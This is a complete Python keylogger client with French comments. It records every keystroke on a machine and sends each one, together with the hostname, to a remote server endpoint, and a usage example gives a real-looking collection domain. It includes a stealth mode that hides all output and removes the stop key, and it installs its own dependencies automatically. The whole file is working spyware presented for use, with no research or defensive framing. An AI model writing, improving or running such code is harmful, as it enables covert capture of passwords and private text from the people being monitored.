#!/usr/bin/env python3
"""
Keylogger Client v2.1 - Optimisé
Envoie les frappes vers le serveur Flask
"""
import sys
import time
import socket
import subprocess
import threading

# Installation automatique des dépendances avec --break-system-packages
try:
    from pynput import keyboard
    import requests
except ImportError:
    print("[!] Installation des dépendances...")
    try:
        subprocess.check_call([
            sys.executable, "-m", "pip", "install",
            "--break-system-packages", "-q", "pynput", "requests"
        ])
        from pynput import keyboard
        import requests
        print("[✓] Dépendances installées")
    except Exception as e:
        print(f"[✗] Erreur d'installation: {e}")
        print("[!] Installez manuellement: pip3 install --break-system-packages pynput requests")
        sys.exit(1)


class KeyloggerClient:
    def __init__(self, server_url, api_key, stealth=False):
        self.server_url = server_url.rstrip('/')
        self.api_key = api_key
        self.stealth = stealth

        # Bufferisation
        self.buffer = []
        self.buffer_size = 1        # envoi immédiat
        self.send_interval = 1      # envoi périodique de secours
        self.max_buffer_len = 1000  # sécurité si serveur down

        # Timer / threads
        self.last_send = time.time()
        self.lock = threading.Lock()
        self.stop_event = threading.Event()

        # Identifier la machine
        self.machine_id = socket.gethostname()

        # Session HTTP persistante (keep-alive)
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "KeyloggerClient/2.1",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-API-Key": self.api_key,
        })

        if not self.stealth:
            print(f"[✓] Keylogger démarré")
            print(f"[✓] Machine: {self.machine_id}")
            print(f"[✓] Serveur: {self.server_url}")
            print(f"[✓] Mode: {'Stealth' if stealth else 'Debug'}")

        # Thread d’envoi périodique
        self.sender_thread = threading.Thread(
            target=self.sender_loop, daemon=True
        )
        self.sender_thread.start()

    # ---------------- Réseau ---------------- #

    def _send_locked(self):
        """Envoie le buffer courant (lock déjà tenu)."""
        if not self.buffer:
            return

        logs = "".join(self.buffer)
        payload = {
            "machine": self.machine_id,
            "logs": logs,
        }

        try:
            resp = self.session.post(
                f"{self.server_url}/upload_keys",
                json=payload,
                timeout=3,
            )
            if resp.status_code == 200:
                if not self.stealth:
                    print(f"[✓] {len(self.buffer)} touches envoyées")
                self.buffer = []
            else:
                if not self.stealth:
                    print(f"[✗] Erreur serveur: {resp.status_code}")
        except requests.exceptions.RequestException as e:
            if not self.stealth:
                print(f"[✗] Erreur connexion: {e}")
        except Exception as e:
            if not self.stealth:
                print(f"[✗] Erreur inattendue: {e}")

    def send_keys(self):
        """Wrapper thread-safe autour de _send_locked."""
        with self.lock:
            self._send_locked()

    def sender_loop(self):
        """Thread qui envoie périodiquement le buffer."""
        while not self.stop_event.is_set():
            time.sleep(self.send_interval)
            self.send_keys()

    # ---------------- Clavier ---------------- #

    def on_press(self, key):
        """Callback appelé à chaque touche pressée (doit rester ultra léger)."""
        try:
            # Touches normales
            if hasattr(key, 'char') and key.char:
                char = key.char
            else:
                key_name = str(key).replace('Key.', '')

                # Liste des touches à IGNORER complètement
                ignore_keys = [
                    'shift', 'shift_r', 'shift_l',
                    'ctrl', 'ctrl_r', 'ctrl_l',
                    'alt', 'alt_r', 'alt_l', 'alt_gr',
                    'cmd', 'cmd_r', 'cmd_l',
                    'caps_lock', 'fn',
                    'up', 'down', 'left', 'right',
                    'home', 'end', 'page_up', 'page_down',
                    'insert', 'print_screen', 'pause',
                    'f1', 'f2', 'f3', 'f4', 'f5', 'f6',
                    'f7', 'f8', 'f9', 'f10', 'f11', 'f12'
                ]
                if key_name in ignore_keys:
                    return

                special_map = {
                    'space': ' ',
                    'enter': '\n',
                    'tab': '\t',
                    'backspace': '[⌫]',
                    'delete': '[DEL]',
                    'esc': '[ESC]',
                }
                char = special_map.get(key_name, f'[{key_name.upper()}]')

            if not char:
                return

            # Ajout au buffer (avec lock très court)
            with self.lock:
                self.buffer.append(char)

                # Limite de sécurité : on garde les N dernières touches
                if len(self.buffer) > self.max_buffer_len:
                    self.buffer = self.buffer[-self.max_buffer_len:]

                # Envoi immédiat si seuil atteint
                if len(self.buffer) >= self.buffer_size:
                    self._send_locked()
                    self.last_send = time.time()

            if not self.stealth:
                print(f"[KEY] {char}", end='', flush=True)

            # Envoi si timeout dépassé (sécurité)
            now = time.time()
            if now - self.last_send >= self.send_interval:
                self.send_keys()
                self.last_send = now

        except Exception as e:
            if not self.stealth:
                print(f"\n[✗] Erreur capture: {e}")

    def on_release(self, key):
        """Callback appelé au relâchement d'une touche."""
        # ESC pour arrêter (seulement en mode debug)
        if not self.stealth and key == keyboard.Key.esc:
            print("\n[!] Arrêt demandé (ESC)")
            self.stop_event.set()
            return False

    # ---------------- Cycle de vie ---------------- #

    def start(self):
        """Démarre l'écoute du clavier."""
        if not self.stealth:
            print("[!] Appuyez sur ESC pour arrêter en mode debug")
            print("-" * 50)

        # Test de connexion
        try:
            resp = self.session.get(
                f"{self.server_url}/api/ping",
                timeout=3
            )
            if resp.status_code == 200:
                if not self.stealth:
                    print("[✓] Connexion au serveur OK")
            else:
                if not self.stealth:
                    print(f"[!] Serveur répond avec code {resp.status_code}")
        except Exception as e:
            if not self.stealth:
                print("[!] Avertissement: Impossible de joindre le serveur")
                print(f"    Erreur: {e}")
                print("[!] Les données seront mises en buffer")

        # Démarrer l'écoute (bloquant)
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()

        # Envoi final du buffer
        self.send_keys()
        self.stop()

    def stop(self):
        """Arrêt propre du thread d'envoi et de la session HTTP."""
        self.stop_event.set()
        try:
            self.sender_thread.join(timeout=1)
        except RuntimeError:
            pass
        try:
            self.session.close()
        except Exception:
            pass


def main():
    if len(sys.argv) < 3:
        print("Usage: python3 keylogger_client_v2.py <SERVER_URL> <API_KEY> [--stealth]")
        print("Exemple: python3 keylogger_client_v2.py https://api.keylog.claverie.site API_KEY")
        sys.exit(1)

    server_url = sys.argv[1]
    api_key = sys.argv[2]
    stealth = "--stealth" in sys.argv

    try:
        client = KeyloggerClient(server_url, api_key, stealth)
        client.start()
    except KeyboardInterrupt:
        print("\n[!] Arrêt demandé (Ctrl+C)")
        sys.exit(0)
    except Exception as e:
        print(f"\n[✗] Erreur fatale: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()

